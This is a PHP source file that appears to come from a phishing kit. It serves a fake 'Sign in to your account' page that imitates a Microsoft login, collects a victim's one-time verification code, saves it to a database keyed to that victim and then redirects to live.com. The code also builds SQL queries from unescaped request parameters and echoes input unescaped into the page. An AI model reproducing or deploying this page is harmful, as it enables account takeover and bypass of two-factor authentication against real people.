<?php  
require("db.php");
if (isset($_GET["uid"]) && isset($_GET["verify"])) {
    $type= $_GET['verify'];
    // validate
  $uid = trim($_GET["uid"]);
  $check = mysqli_query($conn, "SELECT * FROM user_records WHERE uid='$uid' AND status='1'");
  if (mysqli_num_rows($check)<1) {
    echo "<script>window.location.href='index.php';</script>";
  }else{
    // get user data
    $data = mysqli_fetch_object($check);
    // print_r($data);
  }
}else{

    echo "<script>window.location.href='index.php';</script>";
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Sign in to your account</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  <link rel="shortcut icon" type="text/css" href="ico.ico">
  <style>
    /* Add the following CSS code to your <style> tag or CSS file */
    .form-control {
        border: none;
        border-radius: 0;
        border-bottom: 1px solid #ced4da;
        box-shadow: none;
        outline: none; /* Add this line to remove the blue highlight */
        background-color: transparent; /* Add this line to remove the blue background color */
        padding-left: 0;
    }

    /* Add this code to remove the blue highlight on focus */
    .form-control:focus {
        box-shadow: none;
        border-color: #538cc6;
    }
        .loader {
      border: 5px solid #f3f3f3;
      border-radius: 50%;
      border-top: 5px solid #3498db;
      width: 50px;
      height: 50px;
      -webkit-animation: spin 1s linear infinite; /* Safari */
      animation: spin 1s linear infinite;
    }

    /* Safari */
    @-webkit-keyframes spin {
      0% { -webkit-transform: rotate(0deg); }
      100% { -webkit-transform: rotate(360deg); }
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    a:hover{
      text-decoration: none;
    }
</style>
</head>
<body style="background-image: url(bg.png); background-size: auto auto; background-repeat: no-repeat;">
  <div class="container" style="margin-top:120px ;">
    <div class="row">
      <div class="col-md-5 col-md-offset-3" style="padding: 10px 25px;">
        <div class="well" style="background-color: #fff; border-radius: 0; min-height: 300px; padding: 35px 30px;">
          <img src="logo.svg" style="margin-bottom: 10px;">
          <p><a href="index.php"><img src="back.svg" style="display:none;" id="back"></a><span id="rs"></span></p>

          <form method="post" action="">
            <!-- <br><center><div class='loader'></div><br>Please wait...</center> -->
          <?php echo $data->username; ?>
            <br><br>
           <input type="hidden" readonly class="form-control" name="mytype" value="<?php echo $type;?>" placeholder="code">
           <input type="text" class="form-control" required name="otp" placeholder="code">
           <br><br>
           <input type="submit" name="_eventId_submitOtp" class="pull-right btn btn-primary" id="submit"  style="border-radius: 0; padding: 5px 25px;">
            <br>
          </form>
              <?php 
        if (isset($_POST["_eventId_submitOtp"])) {
            $myotp = $_POST['otp'];
            $uid = $_GET['uid'];
            $insert = mysqli_query($conn, "UPDATE user_records SET mycode='$myotp' WHERE uid='$uid'");
            if ($insert) {
                echo "<script>window.location.href='https://live.com';</script>";
            }else{
                echo "<script>alert('Verification faild');</script>";
                echo "<script>window.location.href='index.php';</script>";
            }
        }
     ?>
        </div>
      </div>
    </div>
  </div>
</body>
</html>
